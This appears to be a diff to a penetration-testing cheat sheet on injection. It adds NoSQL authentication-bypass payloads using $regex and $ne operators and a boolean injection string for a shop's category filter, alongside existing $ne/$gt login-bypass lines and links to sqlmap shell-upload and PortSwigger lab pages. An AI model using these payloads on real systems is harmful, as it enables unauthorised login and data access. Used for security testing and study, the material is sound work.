@@ -118,10 +118,17 @@ login[$gt]=admin&login[$lt]=test&pass[$ne]=1
 login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
 
 JSON
+{"username":{"$regex": "admin*"},"password":{"$ne":""}} # If part of name is known then regex can be known the query the rest
 {"username": {"$ne": null}, "password": {"$ne": null}}
 {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
 {"username": {"$gt": undefined}, "password": {"$gt": undefined}}
 {"username": {"$gt":""}, "password": {"$gt":""}}
+```
+
+## List items (hidden tables)
+```
+Payload: '+||+'1'=='1 
+GET /filter?category=Gifts'+||+'1'=='1 
 ```
 
 ## SSJI
@@ -145,3 +152,4 @@ Since the tool is using a menu based system, I'll just link the GitHub.
 - [https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#shell](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap#shell)
 - [https://www.binarytides.com/sqlmap-hacking-tutorial/](https://www.binarytides.com/sqlmap-hacking-tutorial/)
 - [https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/](https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/)
+- [https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-bypass-authentication)
